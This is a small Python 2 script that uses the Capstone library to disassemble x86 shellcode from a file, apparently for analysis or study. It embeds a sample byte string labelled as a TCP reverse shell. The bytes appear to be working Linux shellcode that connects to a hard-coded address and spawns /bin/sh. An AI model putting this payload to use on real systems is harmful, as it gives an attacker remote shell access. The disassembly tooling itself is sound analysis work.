#!/usr/bin/python
from capstone import *
import sys
#reference: from http://www.capstone-engine.org/lang_python.html

#a tcp reverse shell sample
sample_shellcode = (
"\x31\xdb\xf7\xe3\x6a\x66\x58\xfe\xc3"
"\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80"
"\x96\x31\xc0\xfe\xc3\x88\xda\xfe\xc3"
"\x50\xc6\x04\x24\xc0\xc6\x44\x24\x01"
"\xa8\x88\x44\x24\x02\xc6\x44\x24\x03"
"\x14\x66\x68\x7a\x69\x66\x52\x66\x31"
"\xd2\x89\xe1\x6a\x10\x51\x56\x89\xe1"
"\x6a\x66\x58\xcd\x80\x89\xf3\x6a\x02"
"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xeb"
"\x08\x5b\x50\x89\xe1\xb0\x0b\xcd\x80"
"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68"
)

def main():
	if len(sys.argv) < 3:
		usage()
		sys.exit(1)

	out_filename = sys.argv[1]
	shellcode_filename = sys.argv[2]

	shellcode_fd = open(shellcode_filename, "rb")

	shellcode = ""

	#get the raw bytes from the file
	for line in shellcode_fd.readlines():
		shellcode += line

	shellcode_fd.close()

	print "[+] Disassembling shellcode and writing to %s [+]\n" %out_filename
	

	to_outfile(out_filename, disassemble(shellcode))

	print "[+] Done [+]\n"

def usage():
	print "%s <out_file> <shellcode_file>" %sys.argv[0]

def to_outfile(file_name, disassembly):
	fd = open(file_name, "w")

	fd.write(disassembly)

	fd.close()


#This function disassembles the given shellcode using
#capstones disasm method.
def disassemble(shellcode):
	disassembled = ""	
	#we create a disassembler object from the capstone constructor
	#Cs, the two arguments are the architecture and the mode.
	disassembler = Cs(CS_ARCH_X86, CS_MODE_32)

	#we call the disasm function of our class here, the second argument 
	#is the starting address of the code
	for op in disassembler.disasm(shellcode, 0x0):
		#we get a list back from the call that gives us access to
		#certain fields, such as op_str
		disassembled = \
		disassembled + "0x%x:\t%s\t%s\n" %(op.address, op.mnemonic, op.op_str)

	return disassembled




if __name__ == '__main__':
	main()



